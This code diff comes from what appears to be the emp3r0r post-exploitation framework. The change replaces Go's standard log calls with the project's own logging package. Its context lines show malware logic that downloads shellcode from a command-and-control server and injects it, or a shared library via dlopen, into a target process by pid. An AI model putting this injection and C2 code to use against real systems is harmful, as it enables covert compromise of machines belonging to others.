@@ -5,7 +5,7 @@ package modules
 
 import (
 	"fmt"
-	"log"
+	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 	"os"
 	"runtime"
 	"strings"
@@ -97,23 +97,23 @@ func prepare_shared_lib(checksum string) (path string, err error) {
 func prepare_sc(pid int, checksum string) (shellcode string, shellcodeLen int) {
 	sc, err := c2transport.SmartDownload("", "shellcode.txt", "", checksum)
 	if err != nil {
-		log.Printf("Failed to download shellcode.txt from CC: %v", err)
+		logging.Printf("Failed to download shellcode.txt from CC: %v", err)
 		// prepare guardian_shellcode
 		def.GuardianShellcode, err = prepare_guardian_sc(pid)
 		if err != nil {
-			log.Printf("Failed to prepare_guardian_sc: %v", err)
+			logging.Printf("Failed to prepare_guardian_sc: %v", err)
 			return
 		}
 		sc = []byte(def.GuardianShellcode)
 	}
 	shellcode = string(sc)
-	log.Printf("Collected shellcode: %s", shellcode)
+	logging.Printf("Collected shellcode: %s", shellcode)
 	shellcodeLen = strings.Count(string(shellcode), "0x")
 	if shellcodeLen == 0 {
-		log.Printf("Failed to collect shellcode")
+		logging.Printf("Failed to collect shellcode")
 		return
 	}
-	log.Printf("Collected %d bytes of shellcode, preparing to inject", shellcodeLen)
+	logging.Printf("Collected %d bytes of shellcode, preparing to inject", shellcodeLen)
 	return
 }
 
@@ -135,7 +135,7 @@ func InjectorHandler(pid int, method, checksum string) (err error) {
 	case "shared_library":
 		so_path, e := prepare_shared_lib(checksum)
 		if e != nil {
-			log.Printf("Injecting loader.so instead")
+			logging.Printf("Injecting loader.so instead")
 			err = InjectLoader(pid)
 			return err
 		}
@@ -151,9 +151,9 @@ func InjectorHandler(pid int, method, checksum string) (err error) {
 func InjectSharedLib(so_path string, pid int) (err error) {
 	dlopen_addr, err := exeutil.GetSymFromLibc(pid, "__libc_dlopen_mode")
 	if err != nil {
-		log.Printf("failed to get __libc_dlopen_mode address for %d: %v, trying `dlopen`", pid, err)
+		logging.Printf("failed to get __libc_dlopen_mode address for %d: %v, trying `dlopen`", pid, err)
 	}
-	log.Printf("dlopen_addr: %v", dlopen_addr)
+	logging.Printf("dlopen_addr: %v", dlopen_addr)
 	dlopen_addr, err = exeutil.GetSymFromLibc(pid, "dlopen")
 	if err != nil {
 		return fmt.Errorf("failed to get dlopen address for %d: %v", pid, err)
